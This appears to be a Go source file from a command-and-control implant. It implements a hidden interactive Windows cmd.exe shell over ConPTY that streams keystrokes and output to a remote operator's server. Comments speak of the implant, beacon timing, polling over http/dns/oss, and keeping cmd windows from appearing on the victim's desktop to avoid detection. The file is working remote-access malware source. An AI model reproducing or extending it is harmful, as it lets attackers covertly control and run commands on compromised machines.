//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"os"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 基于 Windows ConPTY (CreatePseudoConsole, Win10 1809+) 的真正交互式终端实现。
// 接口与协议与 Linux 端 commands_linux.go 的 PTY 实现完全一致：
//   - StartInteractiveShell / SendInteractiveInput / StopInteractiveShell
//   - PTY 输出通过 communication.DataProcess(36, data) 回传（cmdType 36 = INTERACTIVE_SHELL_INPUT）
//   - 终端尺寸调整复用 \x01 + JSON(TerminalSize) 协议
// 因此服务端 xterm_terminal.go 的 cmdType 35/36/37 通路无需改动即可同时支持 Linux PTY 与 Windows ConPTY。

const (
	procThreadAttributePseudoConsole = 0x00020016
	conptyDefaultCols                = 80
	conptyDefaultRows                = 24
)

var (
	kernel32DLL                   = windows.NewLazySystemDLL("kernel32.dll")
	procCreatePseudoConsole       = kernel32DLL.NewProc("CreatePseudoConsole")
	procResizePseudoConsole       = kernel32DLL.NewProc("ResizePseudoConsole")
	procClosePseudoConsole        = kernel32DLL.NewProc("ClosePseudoConsole")
	procUpdateProcThreadAttribute = kernel32DLL.NewProc("UpdateProcThreadAttribute")

	globalConPTY *conPTYSession
	conPTYMutex  sync.Mutex
)

// TerminalSize 终端窗口大小（与 Linux 端 JSON 协议保持一致）
type TerminalSize struct {
	Rows uint16 `json:"rows"`
	Cols uint16 `json:"cols"`
	X    uint16 `json:"x"`
	Y    uint16 `json:"y"`
}

// conPTYSession ConPTY 交互式终端会话
type conPTYSession struct {
	hPC         windows.Handle // 伪终端句柄
	hInputWrite windows.Handle // 我们向此管道写入用户输入（-> ConPTY 输入端）
	hOutputRead windows.Handle // 我们从此管道读取终端输出（<- ConPTY 输出端）
	procInfo    windows.ProcessInformation
	attrList    *windows.ProcThreadAttributeListContainer
	isActive    bool
	mutex       sync.RWMutex
}

// makeCoord 将列/行打包为 COORD（低 16 位=列 X，高 16 位=行 Y），按值传递给 ConPTY API。
func makeCoord(cols, rows uint16) uintptr {
	return uintptr(uint32(cols) | (uint32(rows) << 16))
}

// InteractiveShellActive 报告本机是否有一个活跃的交互式终端会话。
//
// 轮询传输（http/https/dns/oss）一轮 GET 只取一条命令，空闲轮询间隙就是操作员
// 能感觉到的输入延迟。runloop 据此在"确实有人在用终端"时缩短轮询，会话结束立刻
// 回落到正常信标节奏，不为闲置终端付流量与特征代价。
func InteractiveShellActive() bool {
	conPTYMutex.Lock()
	s := globalConPTY
	conPTYMutex.Unlock()
	if s == nil {
		return false
	}
	// isActive 由会话自己的锁保护（cleanup/monitor 在锁内写），这里不能直接读裸字段
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return s.isActive
}

// StartInteractiveShell 启动基于 ConPTY 的真交互式 Windows 终端（cmd.exe）。
// 【调试期】此前因 cmd 秒退（"session ended"）按部署方要求短暂禁用，
// 现恢复完整实现并在当前控制台输出详细诊断（exit code/管道错误），用于定位根因。
func StartInteractiveShell() ([]byte, error) {
	return startInteractiveShellImpl()
}

// startInteractiveShellImpl 原 StartInteractiveShell 完整实现（暂禁用，保留待恢复）
func startInteractiveShellImpl() ([]byte, error) {
	conPTYMutex.Lock()
	defer conPTYMutex.Unlock()

	if globalConPTY != nil && globalConPTY.isActive {
		return []byte("[✓] ConPTY interactive shell already running"), nil
	}

	// 1. 创建可继承的匿名管道：输入管道（我们写、ConPTY 读）、输出管道（ConPTY 写、我们读）
	sa := &windows.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle: 1,
	}
	var hInputRead, hInputWrite, hOutputRead, hOutputWrite windows.Handle
	if err := windows.CreatePipe(&hInputRead, &hInputWrite, sa, 0); err != nil {
		debuglog.Printf("❌ [ConPTY] create input pipe failed: %v\n", err)
		return nil, fmt.Errorf("create input pipe failed: %v", err)
	}
	if err := windows.CreatePipe(&hOutputRead, &hOutputWrite, sa, 0); err != nil {
		windows.CloseHandle(hInputRead)
		windows.CloseHandle(hInputWrite)
		return nil, fmt.Errorf("create output pipe failed: %v", err)
	}

	// 2. 创建伪终端，绑定输入读端与输出写端
	var hPC windows.Handle
	r1, _, _ := procCreatePseudoConsole.Call(
		makeCoord(conptyDefaultCols, conptyDefaultRows),
		uintptr(hInputRead),
		uintptr(hOutputWrite),
		0,
		uintptr(unsafe.Pointer(&hPC)),
	)
	if r1 != 0 { // HRESULT != S_OK
		debuglog.Printf("❌ [ConPTY] CreatePseudoConsole failed: HRESULT 0x%08x\n", uint32(r1))
		windows.CloseHandle(hInputRead)
		windows.CloseHandle(hInputWrite)
		windows.CloseHandle(hOutputRead)
		windows.CloseHandle(hOutputWrite)
		return nil, fmt.Errorf("CreatePseudoConsole failed: HRESULT 0x%08x", uint32(r1))
	}

	// ConPTY 已接管输入读端与输出写端，关闭本地副本
	windows.CloseHandle(hInputRead)
	windows.CloseHandle(hOutputWrite)

	// 3. 构造进程属性列表，将 ConPTY 句柄关联到子进程
	attrList, err := windows.NewProcThreadAttributeList(1)
	if err != nil {
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hInputWrite)
		windows.CloseHandle(hOutputRead)
		return nil, fmt.Errorf("NewProcThreadAttributeList failed: %v", err)
	}
	// 【关键】PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 属性值是 HPCON 句柄本身（按值传递），
	// 微软官方示例与 Windows Terminal 源码均传 hPC 值；传 &hPC 指针会让系统把
	// hPC 值当指针解引用 → 属性不生效 → cmd 以真实窗口启动（用户桌面弹 cmd 窗口）。
	// 恢复手写 syscall 按值传递（此前用 x/sys Update 传指针导致弹窗）。
	r1, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(attrList.List())),
		0,
		procThreadAttributePseudoConsole,
		uintptr(hPC),
		unsafe.Sizeof(hPC),
		0,
		0,
	)
	if r1 == 0 {
		debuglog.Printf("❌ [ConPTY] UpdateProcThreadAttribute failed\n")
		attrList.Delete()
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hInputWrite)
		windows.CloseHandle(hOutputRead)
		return nil, fmt.Errorf("UpdateProcThreadAttribute failed")
	}

	// 4. 启动 cmd.exe 附加到 ConPTY；chcp 65001 强制 UTF-8 输出以匹配 xterm.js。
	// 注意：
	//   - 不追加 ">nul" 重定向（ConPTY 下重定向 chcp 输出存在歧义，且无必要）
	//   - 显式指定工作目录 System32：客户端若由服务/计划任务启动，其 cwd 可能
	//     不存在或无权限 → cmd 启动后立即退出（"ConPTY session ended" 根因之一）
	//   - cmd 用完整路径：32 位植入体运行时 System32 会重定向到 SysWOW64，
	//     Sysnative 指向真实 System32；64 位下 Sysnative 不存在 → 回退 System32
	cmdPath := `C:\Windows\Sysnative\cmd.exe`
	if _, err := os.Stat(cmdPath); err != nil {
		cmdPath = `C:\Windows\System32\cmd.exe`
	}
	cmdLine, _ := windows.UTF16PtrFromString(cmdPath + ` /K chcp 65001`)
	cwd, _ := windows.UTF16PtrFromString(`C:\Windows\System32`)
	siEx := windows.StartupInfoEx{
		StartupInfo: windows.StartupInfo{
			Cb: uint32(unsafe.Sizeof(windows.StartupInfoEx{})),
		},
		ProcThreadAttributeList: attrList.List(),
	}
	var procInfo windows.ProcessInformation
	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, true,
		uint32(windows.EXTENDED_STARTUPINFO_PRESENT), nil, cwd,
		&siEx.StartupInfo, &procInfo,
	)
	if err != nil {
		debuglog.Printf("❌ [ConPTY] CreateProcess failed: %v\n", err)
		attrList.Delete()
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hInputWrite)
		windows.CloseHandle(hOutputRead)
		return nil, fmt.Errorf("CreateProcess failed: %v", err)
	}

	session := &conPTYSession{
		hPC:         hPC,
		hInputWrite: hInputWrite,
		hOutputRead: hOutputRead,
		procInfo:    procInfo,
		attrList:    attrList,
		isActive:    true,
	}
	globalConPTY = session

	// 5. 启动输出读取与进程监控协程
	go session.readOutput()
	go session.monitorProcess()

	debuglog.Printf("🖥️ [ConPTY] Windows ConPTY 交互式终端已启动（cmd=%s, UTF-8）\n", cmdPath)
	return []byte("[✓] ConPTY interactive terminal started successfully"), nil
}

// readOutput 循环读取 ConPTY 输出并流式回传到服务端 XTerm 会话。
func (s *conPTYSession) readOutput() {
	buf := make([]byte, 4096)
	for {
		s.mutex.RLock()
		active := s.isActive
		s.mutex.RUnlock()
		if !active {
			return
		}
		var n uint32
		err := windows.ReadFile(s.hOutputRead, buf, &n, nil)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			// cmdType 36 = INTERACTIVE_SHELL_INPUT（PTY 输出通道），与服务端 XTerm 路由一致
			communication.DataProcess(36, data)
		}
		if err != nil {
			// 管道关闭（ERROR_BROKEN_PIPE / EOF）等，结束读取
			debuglog.Printf("🔌 [ConPTY] readOutput 结束: %v (n=%d)\n", err, n)
			break
		}
	}
}

// monitorProcess 监控 cmd.exe 进程状态，进程退出后清理会话。
func (s *conPTYSession) monitorProcess() {
	// WaitForSingleObject 返回 WAIT_OBJECT_0=进程退出；WAIT_FAILED 立即返回
	status, _ := windows.WaitForSingleObject(s.procInfo.Process, windows.INFINITE)

	// 获取退出码（诊断：区分正常 exit / 崩溃 / 被终止）
	var exitCode uint32
	windows.GetExitCodeProcess(s.procInfo.Process, &exitCode)

	s.mutex.Lock()
	s.isActive = false
	s.mutex.Unlock()

	debuglog.Printf("🖥️ [ConPTY] cmd.exe 已退出: wait=0x%x exitCode=%d\n", status, exitCode)
	communication.DataProcess(36, []byte(fmt.Sprintf("\r\n[!] ConPTY session ended (exit code %d)\r\n", exitCode)))

	conPTYMutex.Lock()
	if globalConPTY == s {
		s.cleanup()
		globalConPTY = nil
	}
	conPTYMutex.Unlock()
}

// SendInteractiveInput 发送输入到 ConPTY 终端（处理 \x01+JSON 尺寸调整协议）。
func SendInteractiveInput(input []byte) ([]byte, error) {
	conPTYMutex.Lock()
	defer conPTYMutex.Unlock()

	// 终端大小调整消息（\x01+JSON）：START 命令尚在处理时前端 xterm 可能已发首个
	// resize，无会话时静默忽略（不报错，避免"no active ConPTY"干扰前端）。
	if len(input) > 0 && input[0] == '\x01' {
		var size TerminalSize
		if json.Unmarshal(input[1:], &size) != nil {
			return []byte("[!] invalid resize payload"), nil
		}
		if globalConPTY == nil || !globalConPTY.isActive {
			return nil, nil
		}
		return globalConPTY.resize(size.Cols, size.Rows)
	}

	if globalConPTY == nil || !globalConPTY.isActive {
		return nil, errors.New("no active ConPTY terminal session")
	}

	globalConPTY.mutex.RLock()
	defer globalConPTY.mutex.RUnlock()

	var n uint32
	err := windows.WriteFile(globalConPTY.hInputWrite, input, &n, nil)
	if err != nil {
		return nil, fmt.Errorf("write to ConPTY failed: %v", err)
	}
	return []byte(fmt.Sprintf("[+] %d bytes sent to ConPTY", n)), nil
}

// resize 调整 ConPTY 终端大小。
func (s *conPTYSession) resize(cols, rows uint16) ([]byte, error) {
	s.mutex.Lock()
	defer s.mutex.Unlock()

	if !s.isActive {
		return nil, errors.New("ConPTY session not active")
	}
	r1, _, _ := procResizePseudoConsole.Call(uintptr(s.hPC), makeCoord(cols, rows))
	if r1 != 0 {
		return nil, fmt.Errorf("ResizePseudoConsole failed: HRESULT 0x%08x", uint32(r1))
	}
	return []byte(fmt.Sprintf("[✓] ConPTY resized to %dx%d", cols, rows)), nil
}

// StopInteractiveShell 停止 ConPTY 交互式终端。
func StopInteractiveShell() ([]byte, error) {
	conPTYMutex.Lock()
	defer conPTYMutex.Unlock()

	if globalConPTY == nil || !globalConPTY.isActive {
		return []byte("[!] No active ConPTY terminal session"), nil
	}

	globalConPTY.cleanup()
	globalConPTY = nil

	debuglog.Println("🔒 [ConPTY] ConPTY 交互式终端已停止")
	return []byte("[✓] ConPTY interactive terminal stopped successfully"), nil
}

// cleanup 清理 ConPTY 与进程资源。
func (s *conPTYSession) cleanup() {
	s.mutex.Lock()
	defer s.mutex.Unlock()

	s.isActive = false

	// 关闭伪终端会终止所有附加到它的客户端进程（cmd.exe），
	// 不依赖 TerminateProcess（可能被 inline-bin 的 patchExit 劫持导致调用线程静默退出）。
	if s.hPC != 0 {
		procClosePseudoConsole.Call(uintptr(s.hPC))
		s.hPC = 0
	}

	if s.procInfo.Process != 0 {
		windows.CloseHandle(s.procInfo.Process)
		s.procInfo.Process = 0
	}
	if s.procInfo.Thread != 0 {
		windows.CloseHandle(s.procInfo.Thread)
		s.procInfo.Thread = 0
	}
	if s.hInputWrite != 0 {
		windows.CloseHandle(s.hInputWrite)
		s.hInputWrite = 0
	}
	if s.hOutputRead != 0 {
		windows.CloseHandle(s.hOutputRead)
		s.hOutputRead = 0
	}
	if s.attrList != nil {
		s.attrList.Delete()
		s.attrList = nil
	}
}
